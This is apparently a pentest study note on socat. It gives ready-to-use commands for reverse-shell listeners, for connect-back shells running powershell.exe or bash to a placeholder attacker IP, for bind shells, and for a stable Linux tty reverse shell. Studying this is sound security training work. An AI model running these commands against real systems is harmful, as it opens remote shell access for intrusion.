## Introduction
- The easiest way to think about socat is as a connector between two points.

#### Reverse Shells 
**syntax**
Here's the syntax for a basic reverse shell listener in socat:
```python
socat TCP-L:<port> -
```
- As always with socat, this is taking two points (a listening port, and standard input) and connecting them together.
- The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to `nc -lvnp <port>`.

**On Windows we would use this command to connect back:**
```python
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```
The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

**This is the equivalent command for a Linux Target:**
```python
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

#### Bind Shells
**On a Linux target we would use the following command:**
```python
socat TCP-L:<PORT> EXEC:"bash -li"
```

**On a Windows target we would use this command for our listener:**
```python
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```
`pipes`: The `pipes` argument enables the usage of pipes to establish bidirectional communication between `socat` and `powershell.exe`. It allows `socat` to act as an intermediary, forwarding data between the TCP connection and the standard input/output (stdin/stdout) of the `powershell.exe` process.

Without the `pipes` argument, `socat` would only be able to execute `powershell.exe` and forward data from the TCP connection to the process's standard input, but it wouldn't be able to capture the process's standard output and send it back to the TCP client. Consequently, any output from `powershell.exe` would be lost, making it less useful for interactive tasks.

**Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.**
```python
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

**a fully stable Linux tty reverse shell**
This will only work when the target is Linux, but is _significantly_ more stable.
**Syntax** - 
```python
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
- As usual, we're connecting two points together. In this case those points are a listening port, and a file.
- 